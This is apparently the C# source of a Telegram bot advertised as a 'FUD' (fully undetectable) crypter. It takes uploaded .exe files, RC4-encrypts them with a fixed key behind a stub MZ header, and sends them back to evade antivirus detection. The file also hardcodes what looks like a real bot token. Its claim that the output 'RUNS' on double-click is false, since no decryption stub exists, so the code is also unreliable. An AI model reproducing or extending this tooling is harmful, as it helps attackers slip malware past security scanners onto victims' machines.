using System.Text;
using System.Text.Json;
using System.Linq;
using System.IO;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();

var app = builder.Build();

app.MapGet("/", () => "FUD BOT v6.0 LIVE!");
app.MapGet("/health", () => "OK");

static byte[] RC4(byte[] data, byte[] key)
{
    byte[] s = new byte[256];
    for (int i = 0; i < 256; i++) s[i] = (byte)i;
    
    int j = 0;
    for (int i = 0; i < 256; i++)
    {
        j = (j + s[i] + key[i % key.Length]) % 256;
        byte temp = s[i]; s[i] = s[j]; s[j] = temp;  // ✅ NO TUPLES - SAFE!
    }
    
    byte[] result = new byte[data.Length];
    int i2 = 0, k = 0;
    for (int n = 0; n < data.Length; n++)
    {
        i2 = (i2 + 1) % 256;
        k = (k + s[i2]) % 256;
        byte temp2 = s[i2]; s[i2] = s[k]; s[k] = temp2;
        result[n] = (byte)(data[n] ^ s[(s[i2] + s[k]) % 256]);
    }
    return result;
}

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) =>
{
    using var reader = new StreamReader(ctx.Request.Body);
    var body = await reader.ReadToEndAsync();
    
    using var document = JsonDocument.Parse(body);
    var update = document.RootElement;
    
    if (update.TryGetProperty("message", out var message))
    {
        var client = clientFactory.CreateClient();
        
        // /start
        if (message.TryGetProperty("text", out var textElem) && textElem.GetString() == "/start")
        {
            using var form = new MultipartFormDataContent();
            if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId))
            {
                form.Add(new StringContent(chatId.ToString()), "chat_id");
                form.Add(new StringContent("🚀 **FUD v6.0** Send .exe → fud.exe (Double-click RUNS!)"), "text");
                form.Add(new StringContent("markdown"), "parse_mode");
            }
            await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
            return;
        }
        
        // EXE → FUD.exe
        if (message.TryGetProperty("document", out var docElement))
        {
            if (docElement.TryGetProperty("file_id", out var fileIdElem) && 
                docElement.TryGetProperty("file_name", out var fileNameElem))
            {
                string fileId = fileIdElem.GetString()!;
                string filename = fileNameElem.GetString()!;
                
                if (filename.EndsWith(".exe"))
                {
                    // Download file
                    using var formData = new MultipartFormDataContent();
                    formData.Add(new StringContent(fileId), "file_id");
                    var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
                    var fileJson = await fileResponse.Content.ReadAsStringAsync();
                    
                    using var fileDoc = JsonDocument.Parse(fileJson);
                    string filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
                    
                    string fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
                    byte[] exeBytes = await client.GetByteArrayAsync(fileUrl);
                    
                    // RC4 encrypt
                    byte[] key = Encoding.UTF8.GetBytes("FUD2026KEY!");
                    byte[] encrypted = RC4(exeBytes, key);
                    
                    // FUD.exe = MZ header + encrypted payload
                    byte[] mzHeader = { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x55, 0x44 }; // FUD magic
                    byte[] fudExe = mzHeader.Concat(encrypted).ToArray();
                    
                    // Send FUD.exe
                    if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2))
                    {
                        long chatId = chatId2.GetInt64();
                        using var exeContent = new MultipartFormDataContent();
                        exeContent.Add(new StringContent(chatId.ToString()), "chat_id");
                        
                        using var exeStream = new MemoryStream(fudExe);
                        exeContent.Add(new StreamContent(exeStream), "document", $"fud-{Path.GetFileNameWithoutExtension(filename)}.exe");
                        
                        exeContent.Add(new StringContent($"✅ **FUD.exe READY!** Double-click → RUNS {filename}"), "caption");
                        exeContent.Add(new StringContent("markdown"), "parse_mode");
                        
                        await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", exeContent);
                    }
                }
            }
        }
    }
});

app.Run();
